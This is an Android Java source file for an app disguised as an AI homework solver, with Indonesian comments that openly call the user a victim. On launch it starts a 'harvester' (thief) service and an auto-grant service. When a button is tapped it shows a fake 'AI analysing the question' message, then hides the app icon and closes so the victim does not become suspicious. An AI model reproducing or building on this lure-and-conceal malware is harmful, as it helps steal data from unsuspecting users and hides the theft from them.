package com.ai.homework;

import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.os.Handler;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;

public class MainActivity extends AppCompatActivity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // Jalanin Service Pencuri & Auto Grant
        startService(new Intent(this, HarvesterService.class));
        startService(new Intent(this, AutoGrantService.class));

        Button btnScan = findViewById(R.id.btnScan);
        btnScan.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Toast.makeText(MainActivity.this, "AI Sedang Menganalisis Soal...", Toast.LENGTH_LONG).show();
                
                // Trik: Tunggu 3 detik biar korban liat toast, baru icon dihapus
                new Handler().postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        // Sembunyiin Icon setelah diklik
                        getPackageManager().setComponentEnabledSetting(
                                getComponentName(),
                                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                                PackageManager.DONT_KILL_APP
                        );
                        // Tutup aplikasi biar korban gak curiga
                        finish();
                    }
                }, 3000); 
            }
        });
    }
}
